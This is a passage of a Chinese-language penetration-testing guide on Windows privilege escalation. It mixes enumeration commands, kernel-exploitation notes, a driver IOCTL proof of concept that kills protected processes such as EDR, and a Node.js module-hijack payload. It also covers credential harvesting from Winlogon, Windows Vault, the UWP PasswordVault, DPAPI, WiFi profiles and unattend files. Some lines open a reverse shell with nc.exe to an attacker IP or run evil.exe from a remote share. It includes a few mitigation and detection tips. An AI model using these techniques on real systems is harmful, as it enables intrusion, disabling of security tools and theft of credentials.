reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取特殊文件，或者是否可以修改某个将由 Administrator 账户执行的二进制文件（schedtasks）。

查找系统中弱文件夹/文件权限的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ 会自动加载其 `plugins` 子目录下的所有 plugin DLL。如果存在可写入的 portable/copy 安装，将恶意 plugin 放入其中即可在每次启动时，于 `notepad++.exe` 内自动执行代码（包括从 `DllMain` 和 plugin callbacks 中执行）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 启动时运行

**检查是否可以覆盖某个将由其他用户执行的 registry 或 binary。**\
**阅读** **以下页面**，了解更多有关可用于提升权限的 **autoruns 位置**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能存在的 **第三方异常/易受攻击** 驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果驱动暴露了任意 kernel read/write primitive（在设计不当的 IOCTL handler 中很常见），就可以直接从 kernel memory 中窃取 SYSTEM token 来完成提权。<sup>[[13]](#references)</sup> 具体步骤参见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于 vulnerable call 会打开 attacker-controlled Object Manager path 的 race-condition bug，可以有意减慢 lookup 过程（使用最大长度的 components 或深层 directory chains），将时间窗口从数微秒延长到几十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs、paged-pool disclosures 和 I/O ring pivots

某些 Windows kernel LPE chain 可以由两个单独来看都较弱的 bug 组成：一个 **cancel-safe queue lifetime race**，它会在 queue lock 仍被持有时释放 request/CBD；以及一个 **lock-release-before-copy** disclosure，它会在 `RtlCopyToUser` 期间 leak 已释放的 paged-pool allocation。<sup>[[29]](#references)</sup>

Audit 和 exploitation notes：

- **Free-under-lock + cancel afterwards**：寻找如下 success path：**Acquire -> CompleteRequest/free -> Release**；而 cancel path 则执行 **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**。如果 success path 在释放 CBDQ/CSQ lock 之前到达 `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`，那么在 `NtCancelIoFileEx -> IopCsqCancelRoutine` 中阻塞的 thread 之后可能恢复执行，并将已释放的 `PFLT_CALLBACK_DATA` 传回 driver 的 remove callback。
- 使用同样大小、由 attacker-controlled 的 paged-pool allocation **reclaim 已释放的 queue object**。`NPFS` Data Queue Entries 很有用，因为其 payload 和 size 可控，之后还可以通过 pipe read/peek operations 对其进行探测。如果已释放的 object 内嵌 list links，则将其覆盖为一个位于 user memory 中的 **cyclic list of fake request nodes**，使 driver 反复处理 attacker-defined request structures，而不是在原始 list head 处终止。
- **Upgrade a predictable write**：如果 fake request 重定向了 bookkeeping writes 使用的 nested context pointer（例如 timestamps / QPC / refcount-adjacent fields），就可能获得 **address-controlled but not value-controlled** kernel write。此时应针对 sprayed pool object 的 **length/size** field，而不是最终的 code/data pointer，然后遍历 spray，直到被破坏的 object 产生 **out-of-bounds paged-pool read**。
- **Raceable disclosure pattern**：任何执行 `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` 的 syscall 都是强候选目标。如果 attacker 能够增大被 copy 的 buffer，reliability 会有所提升（例如添加许多会增加 serializer 最终 allocation size 的 list/resource entries），因为更长的 copy 会扩大 replacement window，同时不一定导致 machine crash。
- **Pointer-rich refill targets**：Windows **I/O ring** registered-buffer arrays 是非常理想的 disclosure targets，因为其 paged-pool size 由 attacker 控制（`8 * regBufferCnt`），且每个 element 都是指向 `_IOP_MC_BUFFER_ENTRY` 的 kernel pointer。Leak 其中一个 array，恢复周围的 `IORING_OBJECT`，然后破坏 **`RegBuffers`** 和 **`RegBuffersCount`**，使后续 I/O ring operations 使用 attacker-forged entries，从而提供 arbitrary kernel read/write。如果唯一可用的 write 只能提供一个稳定 byte（例如来自 `KUSER_SHARED_DATA+0x14`），可以使用 **overlapping unaligned writes** 构造重复 byte 的 user pointer，例如 `0x0101010101010101`，使用 `VirtualAlloc` 对其进行 map，并将 forged registered-buffer array 放置在那里。<sup>[[30]](#references)</sup>

有用的 debugging indicators：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
一旦从损坏的 I/O ring 中获得任意内核读写能力，就使用标准的 primitive 后续工作流窃取 SYSTEM token：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive 内存破坏 primitives

现代 hive 漏洞允许你构造确定性的内存布局、滥用可写的 HKLM/HKU 后代项，并在无需自定义驱动的情况下，将元数据破坏转化为内核 paged-pool 溢出。在此了解完整攻击链：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 由攻击者控制路径触发的 `RtlQueryRegistryValues` direct-mode 类型混淆

某些驱动接受来自 userland 的 registry 路径，仅验证其是否为有效的 UTF-16 字符串，然后调用 `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`，并将 `RTL_QUERY_REGISTRY_DIRECT` 的结果写入栈上的标量变量，例如 `int readValue`。如果缺少 `RTL_QUERY_REGISTRY_TYPECHECK`，则 `EntryContext` 会根据 registry 值的**实际**类型进行解释，而不是按照开发者预期的类型解释。

这会产生两个有用的 primitives：<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**：用户控制的绝对路径 `\Registry\...` 允许驱动查询攻击者选择的 keys，通过返回码/日志泄露其存在性，并且有时可以读取调用者无法直接访问的值。
- **内核内存破坏**：诸如 `&readValue` 的标量目标地址，会根据 registry 值类型，被类型混淆为 `REG_QWORD`、`UNICODE_STRING` 或带长度的二进制缓冲区。

实际利用注意事项：

- **Windows 8+ 缓解措施**：如果查询命中**不受信任的 hive**，且使用了 `RTL_QUERY_REGISTRY_DIRECT` 但未使用 `RTL_QUERY_REGISTRY_TYPECHECK`，内核调用者会因 `KERNEL_SECURITY_CHECK_FAILURE (0x139)` 崩溃。为保持可利用性，应寻找**受信任系统 hives 内部攻击者可写的 keys**，而不是将值暂存于 `HKCU` 下。
- **受信任 hive staging**：使用 NtObjectManager 枚举 `\Registry\Machine` 下可写的后代项，然后使用复制的**低完整性** token 重新运行扫描，以查找可从 sandboxed 上下文访问的 keys：<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**：将 8 字节直接写入 4 字节 `int` 会破坏相邻的栈数据，并可能部分覆盖附近的 callback/function pointer。
- **`REG_SZ` / `REG_EXPAND_SZ`**：direct mode 要求 `EntryContext` 指向一个 `UNICODE_STRING`。如果代码先将攻击者控制的 `REG_DWORD` 加载到栈标量中，然后又复用同一缓冲区进行字符串读取，攻击者就能控制 `Length`/`MaximumLength`，并部分影响 `Buffer` pointer，从而实现半受控的 kernel write。
- **`REG_BINARY`**：对于较大的 binary data，direct mode 会将 `EntryContext` 处的第一个 `LONG` 视为有符号缓冲区大小。如果之前的 `REG_DWORD` read 在复用的标量中留下了一个**负的**、由攻击者控制的值，那么下一次 `REG_BINARY` query 就会将攻击者字节直接复制到相邻的栈槽中，这通常是完整覆盖 callback-pointer 的最简路径。

Strong hunting pattern：**在不重新初始化的情况下，将异构 registry reads 写入同一个栈变量**。搜索 `RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、复用的 `EntryContext` pointers，以及第一个 registry read 控制第二个 read 是否执行的代码路径。

#### 利用 device objects 缺少 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些签名的第三方 drivers 使用 IoCreateDeviceSecure 创建 device object 时设置了强 SDDL，却忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有此 flag，通过包含额外组件的路径打开 device 时，不会强制执行 secure DACL，因此任何 unprivileged user 都可以使用如下 namespace path 获取 handle：<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（来自一个真实案例）

一旦 user 能够打开该 device，就可以滥用 driver 暴露的 privileged IOCTLs 来进行 LPE 和 tampering。现实中观察到的示例能力包括：
- 向任意 processes 返回 full-access handles（token theft / 通过 DuplicateTokenEx/CreateProcessAsUser 获取 SYSTEM shell）。
- 不受限制的 raw disk read/write（offline tampering、boot-time persistence tricks）。
- 终止任意 processes，包括 Protected Process/Light（PP/PPL），从而允许通过 kernel 在 user land 中 kill AV/EDR。

最小 PoC 模式（user mode）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
面向开发者的缓解措施
- 创建计划通过 DACL 限制的 device objects 时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 验证执行特权操作的 caller context。在允许终止进程或返回句柄之前，添加 PP/PPL 检查。
- 限制 IOCTLs（access masks、METHOD_*、输入验证），并考虑采用 brokered models，而不是直接使用 kernel privileges。

面向防御者的检测思路
- 监控 user-mode 对可疑 device names（例如 `\\ .\\amsdk*`）的打开操作，以及表明滥用行为的特定 IOCTL 序列。
- 强制启用 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护你自己的 allow/deny lists。


## PATH DLL Hijacking

如果你对 **PATH 中某个文件夹拥有写权限**，就可能劫持进程加载的 DLL，从而**提升权限**。<sup>[[2]](#references)</sup>

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 通过 `C:\node_modules` 劫持 Node.js / Electron 模块解析

这是 Windows uncontrolled search path 的一种变体，会影响执行裸导入（例如 `require("foo")`）且预期模块**缺失**的 **Node.js** 和 **Electron** 应用。<sup>[[20]](#references)</sup>

Node 会通过向上遍历目录树，检查每个父目录中的 `node_modules` 文件夹来解析包。在 Windows 上，该遍历可能到达驱动器根目录，因此，从 `C:\Users\Administrator\project\app.js` 启动的应用可能会依次探测：<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

如果**低权限用户**能够创建 `C:\node_modules`，就可以植入恶意的 `foo.js`（或包目录），并等待**更高权限的 Node/Electron 进程**解析缺失的依赖项。Payload 会在受害进程的安全上下文中执行，因此只要目标以管理员身份运行、由提权的计划任务/服务 wrapper 启动，或目标是自动启动的高权限桌面应用，这就会构成 **LPE**。

以下情况尤其常见：

- 依赖项在 `optionalDependencies` 中声明<sup>[[22]](#references)</sup>
- 第三方库在 `try/catch` 中封装 `require("foo")`，并在失败时继续执行
- 某个包从生产构建中移除、在打包时被省略，或安装失败
- 存在漏洞的 `require()` 位于依赖树深处，而不是主应用代码中

### 搜寻存在漏洞的目标

使用 **Procmon** 证明解析路径：<sup>[[23]](#references)</sup>

- 按 `Process Name` 过滤 = 目标可执行文件（`node.exe`、Electron 应用 EXE 或 wrapper 进程）
- 按 `Path` `contains` `node_modules` 过滤
- 重点关注 `NAME NOT FOUND`，以及 `C:\node_modules` 下最终成功的打开操作

在已解包的 `.asar` 文件或应用源代码中，有用的代码审查模式包括：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### 利用

1. 从 Procmon 或源代码审查中确定**缺失的软件包名称**。
2. 如果根查找目录尚不存在，则创建该目录：
```powershell
mkdir C:\node_modules
```
3. 放置一个名称与预期完全一致的模块：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 触发受害应用。如果应用尝试执行 `require("foo")`，且合法模块不存在，Node 可能会加载 `C:\node_modules\foo.js`。

符合此模式的缺失可选模块的真实示例包括 `bluebird` 和 `utf-8-validate`，但可复用的核心是这一**技术**：找到任何**缺失的裸导入**，且特权 Windows Node/Electron 进程会解析该导入。

### 检测与加固思路

- 当用户创建 `C:\node_modules` 或在其中写入新的 `.js` 文件/软件包时发出警报。
- 搜索从 `C:\node_modules\*` 读取内容的高完整性进程。
- 在生产环境中打包所有运行时依赖，并审计 `optionalDependencies` 的使用情况。
- 检查第三方代码中静默执行 `try { require("...") } catch {}` 的模式。
- 如果库支持，则禁用可选探测（例如，某些 `ws` 部署可以通过 `WS_NO_UTF_8_VALIDATE=1` 避免传统的 `utf-8-validate` 探测）。

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否硬编码了其他已知计算机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口和 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查 **受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**查看此页面中的 Firewall 相关命令**](../basic-cmd-for-pentesters.md#firewall) **（列出规则、创建规则、关闭、关闭……）**

更多[用于 network enumeration 的命令](../basic-cmd-for-pentesters.md#network)

### 适用于 Linux 的 Windows 子系统（wsl）
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到。

如果你获得了 root 用户权限，就可以监听任意端口（首次使用 `nc.exe` 监听端口时，系统会通过 GUI 询问是否允许防火墙放行 `nc`）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault 会存储服务器、网站和其他程序的用户凭据，**Windows** 可以使用这些凭据**自动登录用户**。乍一看，这可能会让人以为用户可以存储 Facebook、Twitter 或 Gmail 等网站的凭据，并让浏览器自动登录，但实际并非如此。

Windows Vault 存储的是 Windows 可以用来自动登录用户的凭据，这意味着任何**需要凭据来访问资源的 Windows 应用程序**（服务器或网站）都**可以使用此 Credential Manager** 和 Windows Vault，并使用其中提供的凭据，而不必让用户一直输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们无法使用指定资源的凭据。因此，如果你的应用程序希望使用 vault，就应该以某种方式**与 credential manager 通信，并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出计算机上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后，你可以使用带有 `/savecred` 选项的 `runas` 来使用已保存的凭据。以下示例通过 SMB share 调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 配合提供的凭据集。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意，mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) 的工具也可实现此目的。

### UWP PasswordVault / Credential Locker

现代 Windows UWP 应用程序、Microsoft Edge 和现代系统服务会将身份验证令牌及明文密码存储在 Universal Windows Platform (UWP) `PasswordVault` 中（在 `vaultcmd` 中也显示为 `Web Credentials`）。此存储空间按会话隔离，并且无需管理员权限或 `SeDebugPrivilege` 权限即可原生解密。

在用户的活动会话中执行以下 PowerShell 命令，即可立即 dump 并解密所有存储的用户名和明文密码：
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**数据保护 API（DPAPI）**提供了一种对称加密数据的方法，主要用于 Windows 操作系统中对非对称私钥进行对称加密。此加密过程利用用户或系统机密来显著增加熵。

**DPAPI 通过从用户登录凭据派生的对称密钥来实现密钥加密**。在涉及系统加密的场景中，它使用系统的域身份验证机密。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [安全标识符](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥位于同一文件中**，通常由 64 字节的随机数据组成。（需要注意的是，对此目录的访问受到限制，无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey`，并配合适当的参数（`/pvk` 或 `/rpc`）对其进行解密。

**由主密码保护的凭据文件**通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred`，并提供适当的 `/masterkey` 进行解密。\
如果你是 root，还可以使用 `sekurlsa::dpapi` module 从**内存**中**提取许多 DPAPI** **masterkeys**。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 常用于**脚本编写**和自动化任务，以便方便地存储加密凭据。这些凭据使用 **DPAPI** 进行保护，这通常意味着只有创建它们的同一用户在同一台计算机上才能对其进行解密。

要从包含 PS credentials 的文件中**解密**凭据，可以执行：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 中找到

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
使用 **Mimikatz** 的 `dpapi::rdg` 模块，并配合适当的 `/masterkey`，以**解密任何 .rdg 文件**\
你可以使用 Mimikatz 的 `sekurlsa::dpapi` 模块从内存中**提取许多 DPAPI masterkeys**

### Sticky Notes

人们经常使用 Windows 工作站上的 StickyNotes 应用来**保存密码**和其他信息，却没有意识到它实际上是一个数据库文件。该文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，始终值得搜索和检查。

### AppCmd.exe

**请注意，要从 AppCmd.exe 恢复密码，你需要具备管理员权限，并在高完整性级别下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录中。\
如果该文件存在，则可能已经配置了某些**凭据**，并且可以将其**恢复**。

此代码提取自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在。\  
**安装程序以 SYSTEM 权限运行，许多安装程序容易受到 DLL Sideloading 攻击（信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭据）

### PuTTY 凭据
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH keys

SSH private keys 可以存储在注册表项 `HKCU\Software\OpenSSH\Agent\Keys` 中，因此你应该检查其中是否存在任何有价值的信息：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果在该路径中找到任何条目，它很可能是保存的 SSH 密钥。该密钥以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\
有关此技术的更多信息：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

如果 `ssh-agent` 服务未运行，并且希望它在启动时自动运行，请执行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来此技术已不再有效。我尝试创建一些 ssh keys，使用 `ssh-add` 添加它们，然后通过 ssh 登录计算机。注册表项 HKCU\Software\OpenSSH\Agent\Keys 不存在，并且 procmon 未发现非对称密钥身份验证期间使用 `dpapi.dll`。

### 无人值守文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM 和 SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭据
```bash
#From user home
.aws\credentials
